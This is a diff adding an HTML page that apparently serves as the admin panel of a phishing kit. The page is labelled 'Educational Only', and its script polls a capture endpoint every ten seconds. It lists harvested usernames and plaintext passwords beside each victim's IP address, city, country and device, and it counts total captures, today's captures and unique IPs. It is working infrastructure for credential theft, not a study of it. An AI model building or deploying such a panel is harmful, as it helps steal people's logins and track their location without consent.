@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard - Captures</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            padding: 20px;
+        }
+        .header {
+            text-align: center;
+            padding: 20px;
+            border-bottom: 2px solid #00ff00;
+            margin-bottom: 20px;
+        }
+        .header h1 { font-size: 32px; text-shadow: 0 0 20px #00ff00; }
+        .stats {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .stat-card {
+            background: #111;
+            border: 1px solid #00ff00;
+            padding: 20px;
+            border-radius: 10px;
+            flex: 1;
+            min-width: 150px;
+            text-align: center;
+        }
+        .stat-card h3 { font-size: 40px; color: #00ff00; }
+        .stat-card p { color: #888; font-size: 14px; }
+        .capture-card {
+            background: #111;
+            border: 1px solid #333;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+        }
+        .capture-card:hover { border-color: #00ff00; }
+        .capture-card .info { display: flex; justify-content: space-between; flex-wrap: wrap; }
+        .capture-card .field { margin: 5px 0; }
+        .capture-card .label { color: #888; }
+        .capture-card .value { color: #fff; word-break: break-all; }
+        .badge {
+            display: inline-block;
+            padding: 3px 10px;
+            background: #00ff00;
+            color: #000;
+            border-radius: 3px;
+            font-size: 12px;
+            margin-right: 5px;
+        }
+        .refresh-btn {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            padding: 15px 30px;
+            background: #00ff00;
+            color: #000;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>📊 CAPTURE DASHBOARD</h1>
+        <p style="color:#888;margin-top:10px;">Real-time monitoring • Educational Only</p>
+    </div>
+
+    <div class="stats">
+        <div class="stat-card">
+            <h3 id="total">0</h3>
+            <p>Total Captures</p>
+        </div>
+        <div class="stat-card">
+            <h3 id="today">0</h3>
+            <p>Today</p>
+        </div>
+        <div class="stat-card">
+            <h3 id="unique">0</h3>
+            <p>Unique IPs</p>
+        </div>
+    </div>
+
+    <div id="captures"></div>
+
+    <button class="refresh-btn" onclick="loadData()">🔄 REFRESH</button>
+
+    <script>
+        async function loadData() {
+            try {
+                const response = await fetch('/api/capture');
+                const data = await response.json();
+                
+                document.getElementById('total').textContent = data.total;
+                
+                // Today count
+                const today = new Date().toDateString();
+                const todayCaptures = data.captures.filter(c => new Date(c.timestamp).toDateString() === today);
+                document.getElementById('today').textContent = todayCaptures.length;
+                
+                // Unique IPs
+                const ips = new Set(data.captures.map(c => c.ip));
+                document.getElementById('unique').textContent = ips.size;
+                
+                // Render captures
+                const container = document.getElementById('captures');
+                container.innerHTML = data.captures.map((c, i) => `
+                    <div class="capture-card">
+                        <div class="info">
+                            <span class="badge">#${i + 1}</span>
+                            <span style="color:#888;">${new Date(c.timestamp).toLocaleString()}</span>
+                        </div>
+                        <div class="field">
+                            <span class="label">👤 Username:</span>
+                            <span class="value">${c.username}</span>
+                        </div>
+                        <div class="field">
+                            <span class="label">🔑 Password:</span>
+                            <span class="value">${c.password}</span>
+                        </div>
+                        <div class="field">
+                            <span class="label">🌐 IP:</span>
+                            <span class="value">${c.ip}</span>
+                        </div>
+                        <div class="field">
+                            <span class="label">📍 Location:</span>
+                            <span class="value">${c.city || 'Unknown'}, ${c.country || 'Unknown'}</span>
+                        </div>
+                        <div class="field">
+                            <span class="label">📱 Device:</span>
+                            <span class="value">${(c.userAgent || '').substring(0, 80)}</span>
+                        </div>
+                    </div>
+                `).join('');
+                
+            } catch (e) {
+                document.getElementById('captures').innerHTML = '<p style="color:red;">❌ Failed to load data</p>';
+            }
+        }
+        
+        loadData();
+        setInterval(loadData, 10000); // Refresh tiap 10 detik
+    </script>
+</body>
+</html>
